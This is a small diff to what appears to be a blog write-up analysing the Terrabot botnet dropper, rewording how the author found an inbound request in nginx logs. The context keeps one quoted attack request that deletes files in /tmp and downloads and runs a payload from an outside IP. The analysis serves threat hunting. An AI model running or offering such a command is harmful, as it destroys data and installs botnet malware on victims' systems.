@@ -5,7 +5,7 @@ tags: ["malware", "reverse-engineering", "threat-hunting"]
 summary: "Full analysis of the Terrabot botnet dropper: multi-arch payloads, CVE-2026-0073 ADB exploitation, web shell attacks, and detection rules."
 ---
 # Discovery
-Looking at network traffic, we get a request from `150.228.169.149:9171`:
+While reviewing nginx access logs on my VPS, I noticed an unusual inbound request from `150.228.169.149:9171`:
 
 ```
 GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1
